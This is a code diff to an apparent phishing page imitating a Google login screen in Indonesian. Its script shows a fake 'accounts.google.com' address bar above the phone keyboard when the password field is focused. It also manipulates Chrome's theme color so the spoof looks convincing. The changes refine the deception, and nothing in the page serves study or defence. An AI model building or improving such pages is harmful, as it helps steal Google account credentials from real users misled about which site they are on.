@@ -4,7 +4,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login – Google</title>
 
-<meta name="theme-color" content="#000000" id="theme-color-meta">
+<!-- LIGHT theme color forces Chrome address bar to stay visible -->
+<meta name="theme-color" content="#f1f3f4" id="theme-color-meta">
 
 <style>
 * {
@@ -19,6 +20,9 @@ body {
   min-height: 100vh;
   display: flex;
   flex-direction: column;
+
+  /* Break immersive fullscreen so Chrome keeps URL bar */
+  border-top: 1px solid #111;
 }
 
 /* Main content */
@@ -156,7 +160,7 @@ footer {
   <div class="link">Lupa email?</div>
 
   <div class="info">
-    Bukan komputer Anda? Gunakan jendela Penjelajahan Rahasia untuk login.
+    Bukan Handphone Anda? Gunakan jendela Penjelajahan Rahasia untuk login.
     <a href="#">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
   </div>
 
@@ -167,60 +171,55 @@ footer {
 </div>
 
 <footer>
-  <div>Indonesia ▼</div>
+  <div>America ▼</div>
   <div>Bantuan · Privasi · Persyaratan</div>
 </footer>
 
 <div class="fake-bar" id="fakeBar">accounts.google.com</div>
 
 <script>
-  const input = document.getElementById("myInput");
-  const fakeBar = document.getElementById("fakeBar");
-  const metaTheme = document.getElementById("theme-color-meta");
-  
-  function changeTabColor(color) {
-    metaTheme.setAttribute("content", color);
-  }
-  
-  function updateKeyboardState() {
-    if (!window.visualViewport) return;
-  
-    const keyboardHeight = window.innerHeight - window.visualViewport.height;
-  
-    if (keyboardHeight > 0) {
-      // Keyboard is open
-      fakeBar.classList.add("show");
-      fakeBar.style.bottom = keyboardHeight + "px";
-    } else {
-      // Keyboard closed
-      fakeBar.classList.remove("show");
-      fakeBar.style.bottom = "0px";
-    }
-  }
-  
-  // Focus = prepare UI
-  input.addEventListener("focus", () => {
-    changeTabColor("#000000");
-    setTimeout(() => changeTabColor("#ffffff"), 300);
-    setTimeout(updateKeyboardState, 50);
-  });
-  
-  // Blur = reset UI
-  input.addEventListener("blur", () => {
-    fakeBar.classList.remove("show");
+const input = document.getElementById("myInput");
+const fakeBar = document.getElementById("fakeBar");
+const metaTheme = document.getElementById("theme-color-meta");
+
+function changeTabColor(color) {
+  metaTheme.setAttribute("content", color);
+}
+
+function adjustFakeBar() {
+  const vv = window.visualViewport;
+  if (vv) {
+    fakeBar.style.bottom = (window.innerHeight - vv.height) + "px";
+  } else {
     fakeBar.style.bottom = "0px";
-    changeTabColor("#f1f3f4");
-  });
-  
-  // Keyboard open / close
-  if (window.visualViewport) {
-    window.visualViewport.addEventListener("resize", updateKeyboardState);
   }
-  
-  // Orientation change safety
-  window.addEventListener("orientationchange", updateKeyboardState);
-  </script>
-  
+}
+
+/* Focus — behave like Code 1 */
+input.addEventListener("focus", () => {
+  // Light color keeps Chrome address bar visible
+  changeTabColor("#ffffff");
+
+  // Delay lets Chrome UI settle
+  setTimeout(() => {
+    fakeBar.classList.add("show");
+    adjustFakeBar();
+  }, 500);
+});
+
+/* Blur — reset */
+input.addEventListener("blur", () => {
+  fakeBar.classList.remove("show");
+  fakeBar.style.bottom = "0px";
+  changeTabColor("#f1f3f4");
+});
+
+/* Keyboard / orientation handling */
+if (window.visualViewport) {
+  window.visualViewport.addEventListener("resize", adjustFakeBar);
+}
+window.addEventListener("orientationchange", adjustFakeBar);
+</script>
 
 </body>
 </html>
